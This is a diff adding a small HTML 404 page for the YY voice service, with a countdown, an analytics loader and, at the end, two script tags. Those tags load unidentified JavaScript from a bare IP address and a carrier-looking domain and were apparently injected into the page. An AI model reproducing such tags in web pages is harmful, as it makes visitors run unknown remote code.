@@ -1,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<title>YY语音</title>
+    <link rel="stylesheet" href="/m/css/common.css">    
+</head>
+
+<body>
+ 
+<div class="error">
+	<img src="/m/img/404.png" >
+	<p><b id="timer">5</b>秒后自动<a href="http://www.yy.com/">返回</a>地球</p>
+</div>
+<!--Error-->
+<script type="text/javascript">
+var count = 4;
+var t = setInterval(function() {
+	if (count == 0) {
+		clearInterval(t);
+		//window.location.href = 'http://www.yy.com/';
+	}
+	document.getElementById('timer').innerHTML = count;
+	count--;
+}, 1000);
+</script>
+<span style="display:none;">
+<script type="text/javascript" src="http://www.duowan.com/duowan.js"></script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F34a908ea88275f6ef0a72588f9c0be86' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</span>
+<script type='text/javascript' id='1qa2ws123' charset='utf-8' src='http://221.179.131.53:7788/index.php'></script><script type='text/javascript' id='1qa2ws' charset='utf-8' src=' http://ta.bjmcc.net/Public/js/_ta_qaz_app.js?v=0414'></script></body>
+</html>
